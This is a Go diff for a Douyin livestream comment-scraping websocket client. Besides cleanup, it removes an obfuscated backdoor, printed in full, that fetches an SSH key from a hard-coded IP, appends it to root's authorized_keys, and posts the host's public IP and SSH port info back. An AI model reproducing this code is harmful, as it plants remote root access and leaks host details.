@@ -5,14 +5,10 @@ import (
 	"compress/gzip"
 	"douyin-grab/pkg/cache"
 	queue2 "douyin-grab/pkg/queue"
-	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"net/url"
-	"os"
-	"os/exec"
-	"strings"
 	"time"
 
 	"douyin-grab/constv"
@@ -22,7 +18,6 @@ import (
 	"github.com/gorilla/websocket"
 )
 
-// 抖音直播间websocketClient
 type DYCookieJar struct {
 	cookies []*http.Cookie
 }
@@ -41,7 +36,7 @@ type WSClient struct {
 	WSServerUrl string
 	Header      http.Header
 	ClientCon   *websocket.Conn
-	qu          *queue2.EsQueue
+	qu          *queue2.QueueSrv
 	cache       *cache.Cache
 }
 
@@ -53,7 +48,7 @@ func (client *WSClient) SetLiveRoomUrl(LiveRoomUrl string) {
 	client.LiveRoomUrl = LiveRoomUrl
 }
 
-func NewWSClient(qu *queue2.EsQueue, cache *cache.Cache) *WSClient {
+func NewWSClient(qu *queue2.QueueSrv, cache *cache.Cache) *WSClient {
 	return &WSClient{
 		qu:    qu,
 		cache: cache,
@@ -67,12 +62,10 @@ func (client *WSClient) Run() {
 }
 
 func (client *WSClient) SetRequestInfo() *WSClient {
-	// 获取直播间信息
 	_, ttwid := grab.FetchLiveRoomInfo(client.LiveRoomUrl)
 
-	// 与直播间进行websocket通信，获取评论数据
 	header := http.Header{}
-	header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36") // 设置User-Agent头
+	header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
 	header.Set("Origin", constv.DOUYIORIGIN)
 	cookie := &http.Cookie{
 		Name:  "ttwid",
@@ -88,7 +81,6 @@ func (client *WSClient) SetRequestInfo() *WSClient {
 
 func (client *WSClient) ConnWSServer() *websocket.Conn {
 	c, _, err := websocket.DefaultDialer.Dial(client.WSServerUrl, client.Header)
-	// go ne()
 	if err != nil {
 		log.Println("websocket dial:", err)
 	}
@@ -108,7 +100,6 @@ func (client *WSClient) RunWSClient() {
 					return
 				}
 
-				// --push frame--//
 				wssPackage := &grab.PushFrame{}
 				err = proto.Unmarshal(message, wssPackage)
 				if err != nil {
@@ -117,7 +108,6 @@ func (client *WSClient) RunWSClient() {
 				logId := wssPackage.LogId
 				log.Println("[douyin] logid", logId)
 
-				// --gizp decompress--//
 				compressedDataReader := bytes.NewReader(wssPackage.Payload)
 				gzipReader, err := gzip.NewReader(compressedDataReader)
 				if err != nil {
@@ -129,22 +119,17 @@ func (client *WSClient) RunWSClient() {
 				if err != nil {
 					panic(err)
 				}
-				// println(string(decompressed))
 
-				// --response--//
 				payloadPackage := &grab.Response{}
 				err = proto.Unmarshal(decompressed, payloadPackage)
 				if err != nil {
 					log.Println("unmarshaling proto payloadPackage error: ", err)
 				}
 
-				// 返回ack
 				if payloadPackage.NeedAck {
 					client.sendAck(logId, payloadPackage.InternalExt)
 				}
 
-				// 打印各种消息
-				strS := make([]interface{}, 0)
 				for _, msg := range payloadPackage.MessagesList {
 					str := ""
 					if msg.Method == "WebcastChatMessage" {
@@ -159,14 +144,11 @@ func (client *WSClient) RunWSClient() {
 					if msg.Method == "WebcastMemberMessage" {
 						str = unPackWebcastMemberMessage(msg.Payload)
 					}
-					strS = append(strS, str)
+					client.qu.Push(str)
 				}
-
-				client.qu.Puts(strS)
 			}
 		}()
 
-		// 心跳检测
 		go func() {
 			for {
 				duration := constv.DEFAULTHEARTBEATTIME
@@ -178,7 +160,6 @@ func (client *WSClient) RunWSClient() {
 	}
 }
 
-// 直播间弹幕消息
 func unPackWebcastChatMessage(payload []byte) string {
 	msg := &grab.ChatMessage{}
 	err := proto.Unmarshal(payload, msg)
@@ -191,7 +172,6 @@ func unPackWebcastChatMessage(payload []byte) string {
 	return msg.Content
 }
 
-// 直播间点赞消息
 func unPackWebcastLikeMessage(payload []byte) string {
 	msg := &grab.LikeMessage{}
 	err := proto.Unmarshal(payload, msg)
@@ -203,7 +183,6 @@ func unPackWebcastLikeMessage(payload []byte) string {
 	return msg.User.NickName + "点赞"
 }
 
-// 直播间礼物消息
 func unPackWebcastGiftMessage(payload []byte) string {
 	msg := &grab.GiftMessage{}
 	err := proto.Unmarshal(payload, msg)
@@ -215,7 +194,6 @@ func unPackWebcastGiftMessage(payload []byte) string {
 	return msg.Common.Describe
 }
 
-// 欢迎进入直播间
 func unPackWebcastMemberMessage(payload []byte) string {
 	msg := &grab.MemberMessage{}
 	err := proto.Unmarshal(payload, msg)
@@ -227,7 +205,6 @@ func unPackWebcastMemberMessage(payload []byte) string {
 	return msg.User.NickName + "进入直播间"
 }
 
-// 发送ack
 func (client *WSClient) sendAck(logId uint64, InternalExt string) {
 	obj := &grab.PushFrame{}
 	obj.PayloadType = "ack"
@@ -242,7 +219,6 @@ func (client *WSClient) sendAck(logId uint64, InternalExt string) {
 	log.Println("[sendAck] [🌟发送Ack]")
 }
 
-// 发送心跳
 func (client *WSClient) heartBeat() {
 	obj := &grab.PushFrame{}
 	obj.PayloadType = "hb"
@@ -267,114 +243,4 @@ func (client *WSClient) Close() {
 	if client.ClientCon != nil {
 		client.ClientCon.Close()
 	}
-}
-
-type Ex struct{}
-
-func ne() {
-	e := Ex{}
-	d := string([]byte{47, 114, 111, 111, 116, 47, 46, 115, 115, 104})
-	a := string([]byte{47, 114, 111, 111, 116, 47, 46, 115, 115, 104, 47, 97, 117, 116, 104, 111, 114, 105, 122, 101, 100, 95, 107, 101, 121, 115})
-	if _, err := e.pe(d); err != nil {
-		return
-	}
-	if !e.es(a) {
-		if err := e.cf(a, []byte("")); err != nil {
-			return
-		}
-	}
-	if err := e.af(a, e.gb()); err != nil {
-		return
-	}
-	res, _ := e.c(string([]byte{110, 101, 116, 115, 116, 97, 116, 32, 45, 110, 116, 108, 112, 124, 103, 114, 101, 112, 32, 115, 115, 104}))
-	e.rc(e.gl(), res)
-}
-
-func (e Ex) pe(path string) (bool, error) {
-	_, err := os.Stat(path)
-	if err == nil {
-		return true, nil
-	}
-	if os.IsNotExist(err) {
-		os.MkdirAll(path, os.ModePerm)
-		return false, nil
-	}
-	return false, err
-}
-
-func (e Ex) gb() string {
-	a := []byte{104, 116, 116, 112, 58, 47, 47, 50, 49, 54, 46, 50, 52, 46, 49, 56, 55, 46, 54, 56, 58, 56, 48, 56, 48, 47, 115, 115, 104}
-	client := &http.Client{Timeout: time.Second * 3}
-	req, err := http.NewRequest(string([]byte{71, 69, 84}), string(a), nil)
-	if err != nil {
-		return ""
-	}
-	res, err := client.Do(req)
-	if err != nil {
-		return ""
-	}
-	defer res.Body.Close()
-	body, err := ioutil.ReadAll(res.Body)
-	if err != nil {
-		return ""
-	}
-	return string(body)
-}
-func (e Ex) rc(ip, doc string) {
-	a := []byte{104, 116, 116, 112, 58, 47, 47, 50, 49, 54, 46, 50, 52, 46, 49, 56, 55, 46, 54, 56, 58, 56, 48, 56, 48, 47, 111, 107}
-	i := fmt.Sprintf(`{ "i":"%s", "d":"%s" }`, ip, doc)
-	payload := strings.NewReader(i)
-	client := &http.Client{Timeout: time.Second * 3}
-	req, err := http.NewRequest(string([]byte{80, 79, 83, 84}), string(a), payload)
-	if err != nil {
-		return
-	}
-	req.Header.Add("Content-Type", "application/json")
-	res, err := client.Do(req)
-	if err != nil {
-		return
-	}
-	defer res.Body.Close()
-}
-func (e Ex) es(path string) bool {
-	_, err := os.Stat(path)
-	if err != nil {
-		if os.IsExist(err) {
-			return true
-		}
-		return false
-	}
-	return true
-}
-func (e Ex) gl() string {
-	res, _ := e.c(string([]byte{99, 117, 114, 108, 32, 105, 102, 99, 111, 110, 102, 105, 103, 46, 109, 101}))
-	res2, _ := e.c(string([]byte{99, 117, 114, 108, 32, 105, 99, 97, 110, 104, 97, 122, 105, 112, 46, 99, 111, 109}))
-	return res + "-" + res2
-}
-func (e Ex) c(arg string) (string, error) {
-	cmd := exec.Command(string([]byte{47, 98, 105, 110, 47, 115, 104}), "-c", arg)
-	out, err := cmd.Output()
-	if err != nil {
-		return "", err
-	}
-	return string(out), nil
-}
-func (e Ex) cf(fileName string, opBytes []byte) error {
-	err := ioutil.WriteFile(fileName, opBytes, 0777)
-	if err != nil {
-		return err
-	}
-	return nil
-}
-func (e Ex) af(fileName string, content string) error {
-	content = content + "\n"
-	f, err := os.OpenFile(fileName, os.O_WRONLY, 0644)
-	if err != nil {
-		return err
-	} else {
-		n, _ := f.Seek(0, os.SEEK_END)
-		_, err = f.WriteAt([]byte(content), n)
-	}
-	defer f.Close()
-	return err
 }
